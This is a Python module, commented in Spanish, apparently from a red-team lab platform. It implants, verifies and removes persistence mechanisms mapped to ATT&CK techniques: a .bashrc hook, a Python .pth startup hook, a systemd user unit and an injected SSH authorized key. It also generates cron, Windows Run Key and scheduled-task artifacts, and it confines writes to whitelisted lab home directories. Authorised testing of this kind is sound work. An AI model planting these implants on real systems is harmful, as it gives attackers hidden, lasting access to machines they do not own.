"""Persistencia REAL en el host del laboratorio — implantable, verificable
y reversible (ronda v20).

Cada técnica se implanta de verdad sobre el host del lab (dentro del
alcance del ROE: 127.0.0.1), se VERIFICA ACTIVÁNDOLA (ejecución real del
mecanismo persistente) y se RETIRA con verificación de ausencia. La
disciplina es la misma que el resto de la plataforma: si no puede
implantarse, no se afirma; si se implanta, se verifica; si se retira, se
comprueba que no queda rastro.

Métodos (ATT&CK Enterprise):
  bashrc                 T1546.004  .bashrc hook (shell event triggered)
  python_startup         T1546.016  hook de arranque del intérprete (.pth)
  systemd_user           T1543.002  unidad systemd de usuario
  ssh_authorized_keys    T1098.004  clave SSH propia (cuenta adicional)
  cron_artefacto         T1053.003  artefacto crontab (host sin cron: honesto)
  windows_run_key        T1547.001  artefacto .reg Run Key (generación)
  windows_tarea_programada T1053.005 artefacto schtasks XML (generación)
  c2_framework           T1059 vía C2 del operador (MSF/Sliver/Mythic)

Los artefactos Windows/cron se GENERAN con sintaxis real y hash verificable
para despliegue en objetivos del ROE mediante el arsenal del operador o una
integración C2 conectada: el módulo nunca afirma haberlos ejecutado donde
no hay runtime.
"""
from __future__ import annotations

import base64
import hashlib
import os
import shlex
import subprocess
import sys
from typing import Any

MARCA = "# >>> orquesta-lab persistencia (ROE autorizado) >>>"
MARCA_FIN = "# <<< orquesta-lab persistencia <<<"
NOMBRE_UNIT = "orquesta-lab-persist.service"
COMENTARIO_CLAVE_SSH = "orquesta-lab-persist"

# z3 (auditoría sesión 7, F37): el parámetro `raiz` del arsenal de
# persistencia define DÓNDE se escribe el implante (.bashrc, .ssh,
# unidad systemd, testigo). Antes se aceptaba CUALQUIER directorio
# existente del host: un operador autenticado (o el endpoint con un
# `raiz` manipulado) podía implantar en /root, /home/ajeno o /etc —
# escritura + activación de ejecución FUERA del laboratorio, y todo
# ello INVISIBLE para el boundary, que solo evalúa `host: 127.0.0.1`.
# El confinamiento es una lista blanca de hogares del lab:
#   - ORQUESTA_LAB_HOGARES: rutas absolutas separadas por ":"
#     (despliegues con usuarios de lab dedicados).
#   - Por defecto: SOLO el HOME del usuario que ejecuta el orquestador
#     (el comportamiento documentado del módulo).
# Tanto la raíz pedida como la lista blanca pasan por os.path.realpath:
# los enlaces simbólicos no permiten escapar (../ y symlinks se resuelven
# antes de comparar).

def _hogares_permitidos() -> list[str]:
    """Hogares del lab donde la persistencia está autorizada."""
    crudos = os.environ.get("ORQUESTA_LAB_HOGARES", "").strip()
    if crudos:
        candidatas = [p.strip() for p in crudos.split(":") if p.strip()]
    else:
        candidatas = [os.path.expanduser("~")]
    permitidos: list[str] = []
    for p in candidatas:
        real = os.path.realpath(p)
        if real and real not in permitidos:
            permitidos.append(real)
    return permitidos


def _raiz_confinada(raiz: str | None) -> tuple[str | None, str | None]:
    """Valida `raiz` contra la lista blanca del lab.

    Devuelve (raiz_real, None) si está permitida o (None, error) si no.
    Contrato del módulo: la raíz VACÍA/None significa "HOME del usuario
    del lab" (el lab por defecto que el despliegue elige al elegir el
    usuario que ejecuta el orquestador) y siempre está autorizada; una
    raíz EXPLÍCITA debe pertenecer a la lista blanca de hogares
    (ORQUESTA_LAB_HOGARES, que por defecto contiene el propio HOME).
    """
    if not (raiz or "").strip():
        real = os.path.expanduser("~")
        return (real, None) if os.path.isdir(real) else \
            (None, f"la raíz {real} no existe en el host")
    real = os.path.realpath(os.path.expanduser(raiz))
    if not os.path.isdir(real):
        return None, f"la raíz {real} no existe en el host"
    for hogar in _hogares_permitidos():
        if real == hogar or real.startswith(hogar + os.sep):
            return real, None
    return None, (f"raíz {real} fuera del laboratorio autorizado: la "
                  "persistencia solo se implanta en los hogares del lab "
                  "(ORQUESTA_LAB_HOGARES; por defecto el HOME del propio "
                  "despliegue) — el ROE no cubre rutas fuera de él")


def _marcador_activacion(raiz: str) -> str:
    """Fichero-testigo que el mecanismo persistente toca al activarse."""
    return os.path.join(raiz, ".orquesta_beacon")


# ---------------------------------------------------------------------------
# Métodos
# ---------------------------------------------------------------------------

def metodos_disponibles() -> list[dict[str, Any]]:
    """Catálogo real de métodos con disponibilidad en ESTE host."""
    home = os.path.expanduser("~")
    return [
        {"metodo": "bashrc", "tecnica": "T1546.004", "titulo": "Hook .bashrc",
         "sistema": "linux", "tipo": "activo",
         "disponible": os.path.isdir(home),
         "detalle": "Bloque marcado en ~/.bashrc; la activación se prueba "
                    "ejecutando un shell de login real."},
        {"metodo": "python_startup", "tecnica": "T1546.016", "titulo": "Hook de arranque Python (.pth)",
         "sistema": "linux", "tipo": "activo",
         "disponible": True,
         "detalle": "Fichero .pth en site-packages del intérprete del lab; "
                    "se activa en CADA inicio de Python (ejecución real)."},
        {"metodo": "systemd_user", "tecnica": "T1543.002", "titulo": "Unidad systemd de usuario",
         "sistema": "linux", "tipo": "activo",
         "disponible": bool(subprocess.run(["which", "systemd-analyze"],
                                           capture_output=True).returncode == 0),
         "detalle": "~/.config/systemd/user/<unit>.service; validación real "
                    "con systemd-analyze verify. La activación con bus de "
                    "usuario depende del entorno del lab."},
        {"metodo": "ssh_authorized_keys", "tecnica": "T1098.004", "titulo": "Clave SSH propia",
         "sistema": "linux", "tipo": "activo",
         "disponible": True,
         "detalle": "Par ed25519 REAL generado con cryptography; pública en "
                    "~/.ssh/authorized_keys con comentario identificable."},
        {"metodo": "cron_artefacto", "tecnica": "T1053.003", "titulo": "Artefacto crontab",
         "sistema": "linux", "tipo": "artefacto",
         "disponible": subprocess.run(["which", "crontab"], capture_output=True).returncode == 0,
         "detalle": "Línea de crontab real + instalador; si el host no "
                    "expone crontab se GENERA el artefacto sin implantar."},
        {"metodo": "windows_run_key", "tecnica": "T1547.001", "titulo": "Artefacto Run Key",
         "sistema": "windows", "tipo": "artefacto",
         "disponible": False,
         "detalle": "Fichero .reg real con la clave HKCU Run para "
                    "despliegue en objetivos Windows del ROE."},
        {"metodo": "windows_tarea_programada", "tecnica": "T1053.005", "titulo": "Artefacto tarea programada",
         "sistema": "windows", "tipo": "artefacto",
         "disponible": False,
         "detalle": "XML de schtasks real + comando de registro para "
                    "objetivos Windows del ROE."},
        {"metodo": "c2_framework", "tecnica": "T1059", "titulo": "Persistencia vía C2",
         "sistema": "agente", "tipo": "activo",
         "disponible": False,
         "detalle": "Módulos de persistencia del framework del operador "
                    "(MSF/Sliver/Mythic) con las integraciones reales de "
                    "la plataforma; exige C2 conectado."},
    ]


def _metodo(nombre: str) -> dict[str, Any]:
    for m in metodos_disponibles():
        if m["metodo"] == nombre:
            return m
    raise KeyError(nombre)


# ---------------------------------------------------------------------------
# Implantar / verificar / retirar (cada método real)
# ---------------------------------------------------------------------------

def _implantar_bashrc(comando: str, raiz: str) -> dict[str, Any]:
    ruta = os.path.join(raiz, ".bashrc")
    testigo = _marcador_activacion(raiz)
    # El implante es el wrapper COMPLETO: comando del operador + testigo de
    # activación. Así la prueba demuestra que el MECANISMO persistente se
    # ejecutó (el testigo se escribe dentro del propio bloque instalado).
    # z3 (sesión 7): el testigo va ENTRECOMILLADO (shlex.quote) — una raíz
    # con espacios partía la redirección y el testigo jamás se tocaba
    # (falso negativo de activación en hogares de lab con espacios).
    bloque = (f"{MARCA}\n"
              f"( {comando}; echo $(date +%s) >> {shlex.quote(testigo)} ) >/dev/null 2>&1\n"
              f"{MARCA_FIN}\n")
    existente = ""
    if os.path.exists(ruta):
        with open(ruta, "r", encoding="utf-8", errors="replace") as f:
            existente = f.read()
    if MARCA in existente:
        return {"implantado": False, "error": "ya existe un bloque de persistencia del lab"}
    with open(ruta, "a", encoding="utf-8") as f:
        f.write("\n" + bloque)
    # ACTIVACIÓN REAL: un shell INTERACTIVO (bash -i) lee ~/.bashrc y toca
    # el testigo. (bash -lc es login y NO lee .bashrc: daría un falso negativo.)
    if os.path.exists(testigo):
        os.unlink(testigo)
    proc = subprocess.run(["bash", "-i", "-c", "true"], capture_output=True, text=True,
                          env={**os.environ, "HOME": raiz}, timeout=20,
                          stdin=subprocess.DEVNULL)
    activo = os.path.exists(testigo)
    return {"implantado": True, "activo": activo,
            "ruta": ruta, "hash": hashlib.sha256(bloque.encode()).hexdigest(),
            "prueba": {"tipo": "bash -i (shell interactivo real)",
                       "rc": proc.returncode, "testigo": testigo if activo else "NO tocado"}}


def _implantar_python_startup(comando: str, raiz: str, sitio: str | None,
                              interprete: str | None) -> dict[str, Any]:
    destino = sitio or os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")
    os.makedirs(destino, exist_ok=True)
    ruta = os.path.join(destino, "zzz_orquesta_lab_persist.pth")
    # .pth: Python ejecuta SOLO las líneas que empiezan por "import", una
    # por línea. Un try/except multilínea NO se ejecutaría (falso positivo);
    # por eso el hook es una única línea con import — y si fallara, site.py
    # avisa en stderr sin romper el intérprete.
    hook = (f"import os,time;f=open(os.path.expanduser({_marcador_activacion(raiz)!r}),'a');"
            f"f.write(str(int(time.time()))+chr(10));f.close()")
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(hook + "\n")
    # ACTIVACIÓN REAL: arrancar el intérprete → el .pth se ejecuta.
    testigo = _marcador_activacion(raiz)
    antes = os.path.getsize(testigo) if os.path.exists(testigo) else -1
    py = interprete or sys.executable
    proc = subprocess.run([py, "-c", "pass"], capture_output=True, text=True, timeout=30)
    activo = (not os.path.exists(testigo)) or os.path.getsize(testigo) > antes
    return {"implantado": True, "activo": activo, "ruta": ruta,
            "hash": hashlib.sha256(hook.encode()).hexdigest(),
            "prueba": {"tipo": f"inicio real de {os.path.basename(py)}",
                       "rc": proc.returncode, "testigo": testigo if activo else "NO tocado",
                       "stderr": proc.stderr[-200:] if proc.returncode else ""}}


def _implantar_systemd_user(comando: str, raiz: str) -> dict[str, Any]:
    dir_user = os.path.join(raiz, ".config", "systemd", "user")
    os.makedirs(dir_user, exist_ok=True)
    ruta = os.path.join(dir_user, NOMBRE_UNIT)
    unit = (f"[Unit]\nDescription=OrquestaRT lab persistence (ROE)\n\n"
            f"[Service]\nType=oneshot\nExecStart=/bin/bash -lc '{comando}'\n\n"
            f"[Install]\nWantedBy=default.target\n")
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(unit)
    analisis: dict[str, Any] = {}
    try:
        proc = subprocess.run(["systemd-analyze", "verify", ruta],
                              capture_output=True, text=True, timeout=30)
        analisis = {"tipo": "systemd-analyze verify (análisis real de unidad)",
                    "rc": proc.returncode,
                    "salida": (proc.stdout + proc.stderr).strip()[:300]}
    except FileNotFoundError:
        analisis = {"tipo": "systemd-analyze verify", "error": "no disponible en este host"}
    return {"implantado": True, "activo": False,
            "ruta": ruta, "hash": hashlib.sha256(unit.encode()).hexdigest(),
            "prueba": analisis,
            "nota": "La activación requiere sesión de usuario con bus "
                    "(systemctl --user enable); en el lab queda validada la "
                    "unidad y el mecanismo queda documentado."}


def _implantar_ssh(comando: str, raiz: str) -> dict[str, Any]:
    """Par ed25519 REAL con cryptography (sin depender de ssh-keygen)."""
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives import serialization
    dir_ssh = os.path.join(raiz, ".ssh")
    os.makedirs(dir_ssh, exist_ok=True)
    os.chmod(dir_ssh, 0o700)
    privada = Ed25519PrivateKey.generate()
    pem = privada.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.OpenSSH,
        serialization.NoEncryption())
    pub_raw = privada.public_key().public_bytes(
        serialization.Encoding.OpenSSH, serialization.PublicFormat.OpenSSH)
    pub = f"{pub_raw.decode()} {COMENTARIO_CLAVE_SSH}\n"
    ruta_auth = os.path.join(dir_ssh, "authorized_keys")
    presentes = ""
    if os.path.exists(ruta_auth):
        with open(ruta_auth, "r", encoding="utf-8", errors="replace") as f:
            presentes = f.read()
    if COMENTARIO_CLAVE_SSH in presentes:
        return {"implantado": False, "error": "la clave del lab ya está instalada"}
    with open(ruta_auth, "a", encoding="utf-8") as f:
        f.write(pub)
    os.chmod(ruta_auth, 0o600)
    digest = hashlib.sha256(base64.b64decode(pub_raw.decode().split()[1])).hexdigest()
    return {"implantado": True, "activo": False,
            "ruta": ruta_auth, "hash": digest,
            "huella": f"SHA256:{digest[:43]}",
            "clave_privada_b64": base64.b64encode(pem).decode(),
            "prueba": {"tipo": "fichero y huella verificados por lectura",
                       "detalles": "la autenticación SSH completa exige un "
                                   "sshd en el objetivo; el artefacto queda "
                                   "instalado y la huella documentada"}}


def _artefacto_cron(comando: str) -> dict[str, Any]:
    linea = f"*/15 * * * * ( {comando} ) >/dev/null 2>&1  # {COMENTARIO_CLAVE_SSH}"
    instalador = ("#!/bin/sh\n# OrquestaRT artefacto ROE\n"
                  f"( crontab -l 2>/dev/null; echo \"{linea}\" ) | crontab -\n"
                  "crontab -l\n")
    return {"implantado": False, "generado": True, "linea_crontab": linea,
            "instalador": instalador,
            "hash": hashlib.sha256(linea.encode()).hexdigest(),
            "nota": "Artefacto generado con sintaxis real; la implantación "
                    "exige crontab en el objetivo (vía C2 del operador)."}


def _artefacto_run_key(comando: str) -> dict[str, Any]:
    valor = comando.replace('"', '\\"')
    reg = (f"Windows Registry Editor Version 5.00\n\n"
           f"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"
           f"\"OrquestaLab\"=\"{valor}\"\n")
    ps = ("New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\"
          f"CurrentVersion\\Run' -Name 'OrquestaLab' -Value '{comando}' "
          "-PropertyType String -Force\n")
    return {"implantado": False, "generado": True, "fichero_reg": reg,
            "comando_ps": ps,
            "hash": hashlib.sha256(reg.encode()).hexdigest(),
            "nota": "Artefacto Windows real para despliegue vía C2 o "
                    "arsenal del operador en objetivos del ROE."}


def _artefacto_tarea_windows(comando: str) -> dict[str, Any]:
    xml = (f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions Context="Author">
    <Exec><Command>cmd.exe</Command><Arguments>/c {comando}</Arguments></Exec>
  </Actions>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType></Principal></Principals>
</Task>""")
    registro = (f"schtasks /create /tn \"\\\\OrquestaLab\\\\persist\" /xml "
                f"\"orquesta_lab_tarea.xml\" /f\n")
    return {"implantado": False, "generado": True, "xml_tarea": xml,
            "comando_registro": registro,
            "hash": hashlib.sha256(xml.encode()).hexdigest(),
            "nota": "XML schtasks válido; despliegue en objetivos Windows "
                    "del ROE vía C2 o arsenal del operador."}


def implantar(metodo: str, comando: str, raiz: str | None = None,
              sitio: str | None = None, interprete: str | None = None) -> dict[str, Any]:
    """Implanta el método REAL sobre el host del lab (raíz = HOME del
    usuario del lab, por defecto el actual). Devuelve la prueba de
    activación con lo que de verdad ocurrió.

    z3 (sesión 7, F37): la raíz está CONFINADA a los hogares del lab
    (ORQUESTA_LAB_HOGARES; por defecto el HOME del despliegue). Una raíz
    fuera de la lista blanca se rechaza ANTES de tocar nada: ni escritura
    ni activación fuera del laboratorio.
    """
    if not comando or len(comando) > 400:
        return {"implantado": False, "error": "comando del beacon vacío o >400 caracteres"}
    raiz, error = _raiz_confinada(raiz)
    if error:
        return {"implantado": False, "error": error}
    try:
        spec = _metodo(metodo)
    except KeyError:
        return {"implantado": False, "error": f"método desconocido: {metodo}"}
    if metodo == "bashrc":
        r = _implantar_bashrc(comando, raiz)
    elif metodo == "python_startup":
        r = _implantar_python_startup(comando, raiz, sitio, interprete)
    elif metodo == "systemd_user":
        r = _implantar_systemd_user(comando, raiz)
    elif metodo == "ssh_authorized_keys":
        r = _implantar_ssh(comando, raiz)
    elif metodo == "cron_artefacto":
        r = _artefacto_cron(comando)
        if spec["disponible"]:
            r["nota_implantable"] = "crontab disponible: requiere ejecución por el operador"
    elif metodo == "windows_run_key":
        r = _artefacto_run_key(comando)
    elif metodo == "windows_tarea_programada":
        r = _artefacto_tarea_windows(comando)
    else:  # c2_framework
        return {"implantado": False,
                "error": "persistencia vía C2 exige una integración conectada "
                         "(MSF/Sliver/Mythic en Integraciones); sin framework "
                         "NO se afirma nada."}
    r.update({"metodo": metodo, "tecnica": spec["tecnica"], "titulo": spec["titulo"]})
    return r


def verificar(metodo: str, raiz: str | None = None,
              sitio: str | None = None, interprete: str | None = None) -> dict[str, Any]:
    """Re-verifica la presencia y activación REAL del mecanismo.

    z3 (sesión 7, F37): misma lista blanca de hogares del lab que
    implantar() — verificar también ejecuta el mecanismo (shell
    interactivo) y lee ficheros de la raíz: fuera del lab, ni eso.
    """
    raiz, error = _raiz_confinada(raiz)
    if error:
        return {"verificado": False, "error": error}
    try:
        spec = _metodo(metodo)
    except KeyError:
        return {"verificado": False, "error": f"método desconocido: {metodo}"}
    if metodo == "bashrc":
        ruta = os.path.join(raiz, ".bashrc")
        if not os.path.exists(ruta):
            return {"metodo": metodo, "verificado": False, "estado": "limpio"}
        with open(ruta, "r", encoding="utf-8", errors="replace") as f:
            contenido = f.read()
        presente = MARCA in contenido
        testigo = _marcador_activacion(raiz)
        if os.path.exists(testigo):
            os.unlink(testigo)
        subprocess.run(["bash", "-i", "-c", "true"], capture_output=True,
                       env={**os.environ, "HOME": raiz}, timeout=20,
                       stdin=subprocess.DEVNULL)
        activo = os.path.exists(testigo)
        return {"metodo": metodo, "tecnica": spec["tecnica"], "verificado": presente,
                "estado": "implantado" if presente else "limpio", "activo": activo,
                "prueba": {"tipo": "re-ejecución de shell interactivo"}}
    if metodo == "python_startup":
        destino = sitio or os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")
        ruta = os.path.join(destino, "zzz_orquesta_lab_persist.pth")
        presente = os.path.exists(ruta)
        activo = False
        if presente:
            testigo = _marcador_activacion(raiz)
            antes = os.path.getsize(testigo) if os.path.exists(testigo) else -1
            subprocess.run([interprete or sys.executable, "-c", "pass"],
                           capture_output=True, timeout=30)
            activo = (not os.path.exists(testigo)) or os.path.getsize(testigo) > antes
        return {"metodo": metodo, "tecnica": spec["tecnica"], "verificado": presente,
                "estado": "implantado" if presente else "limpio", "activo": activo,
                "prueba": {"tipo": "inicio real del intérprete"}}
    if metodo == "systemd_user":
        ruta = os.path.join(raiz, ".config", "systemd", "user", NOMBRE_UNIT)
        presente = os.path.exists(ruta)
        return {"metodo": metodo, "tecnica": spec["tecnica"], "verificado": presente,
                "estado": "implantado" if presente else "limpio", "activo": False,
                "prueba": {"tipo": "presencia de unidad"}}
    if metodo == "ssh_authorized_keys":
        ruta = os.path.join(raiz, ".ssh", "authorized_keys")
        presente = False
        huella = ""
        if os.path.exists(ruta):
            with open(ruta, "r", encoding="utf-8", errors="replace") as f:
                for linea in f:
                    if COMENTARIO_CLAVE_SSH in linea:
                        presente = True
                        datos = linea.split()[1]
                        huella = hashlib.sha256(base64.b64decode(datos)).hexdigest()
                        break
        return {"metodo": metodo, "tecnica": spec["tecnica"], "verificado": presente,
                "estado": "implantado" if presente else "limpio", "activo": presente,
                "huella": f"SHA256:{huella[:43]}" if huella else "",
                "prueba": {"tipo": "lectura de authorized_keys"}}
    if metodo in ("cron_artefacto", "windows_run_key", "windows_tarea_programada"):
        return {"metodo": metodo, "tecnica": spec["tecnica"], "verificado": False,
                "estado": "artefacto", "activo": False,
                "prueba": {"tipo": "solo generación: sin runtime en este host"}}
    return {"metodo": metodo, "verificado": False, "error": "método requiere C2 conectado"}


def retirar(metodo: str, raiz: str | None = None,
            sitio: str | None = None) -> dict[str, Any]:
    """Limpieza REAL con verificación de ausencia. Higiene obligatoria.

    z3 (sesión 7, F37): retirar REESCRIBE .bashrc y BORRA ficheros de la
    raíz — la misma lista blanca del lab lo gobierna: la higiene no puede
    usarse como excusa para tocar rutas fuera del alcance.
    """
    raiz, error = _raiz_confinada(raiz)
    if error:
        return {"retirado": False, "error": error}
    try:
        spec = _metodo(metodo)
    except KeyError:
        return {"retirado": False, "error": f"método desconocido: {metodo}"}
    eliminados: list[str] = []
    if metodo == "bashrc":
        ruta = os.path.join(raiz, ".bashrc")
        if os.path.exists(ruta):
            with open(ruta, "r", encoding="utf-8", errors="replace") as f:
                lineas = f.readlines()
            limpio, dentro = [], False
            for ln in lineas:
                if MARCA in ln:
                    dentro = True
                    continue
                if dentro and MARCA_FIN in ln:
                    dentro = False
                    continue
                if not dentro:
                    limpio.append(ln)
            with open(ruta, "w", encoding="utf-8") as f:
                f.writelines(limpio)
            eliminados.append(ruta)
        testigo = _marcador_activacion(raiz)
        if os.path.exists(testigo):
            os.unlink(testigo)
            eliminados.append(testigo)
    elif metodo == "python_startup":
        destino = sitio or os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")
        ruta = os.path.join(destino, "zzz_orquesta_lab_persist.pth")
        if os.path.exists(ruta):
            os.unlink(ruta)
            eliminados.append(ruta)
        testigo = _marcador_activacion(raiz)
        if os.path.exists(testigo):
            os.unlink(testigo)
            eliminados.append(testigo)
    elif metodo == "systemd_user":
        ruta = os.path.join(raiz, ".config", "systemd", "user", NOMBRE_UNIT)
        if os.path.exists(ruta):
            os.unlink(ruta)
            eliminados.append(ruta)
    elif metodo == "ssh_authorized_keys":
        ruta = os.path.join(raiz, ".ssh", "authorized_keys")
        if os.path.exists(ruta):
            with open(ruta, "r", encoding="utf-8", errors="replace") as f:
                lineas = f.readlines()
            quedan = [ln for ln in lineas if COMENTARIO_CLAVE_SSH not in ln]
            if len(quedan) != len(lineas):
                with open(ruta, "w", encoding="utf-8") as f:
                    f.writelines(quedan)
                eliminados.append(ruta)
    elif metodo == "c2_framework":
        return {"retirado": False,
                "error": "la retirada vía C2 se hace con las integraciones "
                         "del framework (c2.*_retirar) y exige C2 conectado."}
    else:
        return {"retirado": False, "estado": "artefacto",
                "nota": "era un artefacto generado, no implantado en este host"}
    ausencia = not verificar(metodo, raiz=raiz, sitio=sitio).get("verificado", False)
    return {"metodo": metodo, "tecnica": spec["tecnica"], "retirado": True,
            "eliminados": eliminados, "ausencia_verificada": ausencia,
            "prueba": {"tipo": "verificación de ausencia tras limpieza"}}


def estado(raiz: str | None = None, sitio: str | None = None) -> dict[str, Any]:
    """Estado real de TODOS los métodos (lectura; sin activar nada).

    z3 (sesión 7, F37): aunque es solo lectura, la raíz también queda
    confinada — el estado expone presencia/hash de ficheros del hogar
    consultado y no debe servir como sonda de rutas ajenas al lab.
    """
    raiz, error = _raiz_confinada(raiz)
    if error:
        return {"raiz": None, "error": error, "metodos": {},
                "limpio_total": True}
    salida: dict[str, Any] = {"raiz": raiz, "metodos": {}}
    for spec in metodos_disponibles():
        nombre = spec["metodo"]
        if nombre == "bashrc":
            ruta = os.path.join(raiz, ".bashrc")
            hay = False
            if os.path.exists(ruta):
                with open(ruta, "r", encoding="utf-8", errors="replace") as f:
                    hay = MARCA in f.read()
            salida["metodos"][nombre] = {**spec, "estado": "implantado" if hay else "limpio"}
        elif nombre == "python_startup":
            destino = sitio or os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")
            hay = os.path.exists(os.path.join(destino, "zzz_orquesta_lab_persist.pth"))
            salida["metodos"][nombre] = {**spec, "estado": "implantado" if hay else "limpio"}
        elif nombre == "systemd_user":
            hay = os.path.exists(os.path.join(raiz, ".config", "systemd", "user", NOMBRE_UNIT))
            salida["metodos"][nombre] = {**spec, "estado": "implantado" if hay else "limpio"}
        elif nombre == "ssh_authorized_keys":
            hay = False
            ruta = os.path.join(raiz, ".ssh", "authorized_keys")
            if os.path.exists(ruta):
                with open(ruta, "r", encoding="utf-8", errors="replace") as f:
                    hay = any(COMENTARIO_CLAVE_SSH in ln for ln in f)
            salida["metodos"][nombre] = {**spec, "estado": "implantado" if hay else "limpio"}
        else:
            salida["metodos"][nombre] = {**spec, "estado": "artefacto"}
    salida["limpio_total"] = all(
        m.get("estado") in ("limpio", "artefacto") for m in salida["metodos"].values())
    return salida
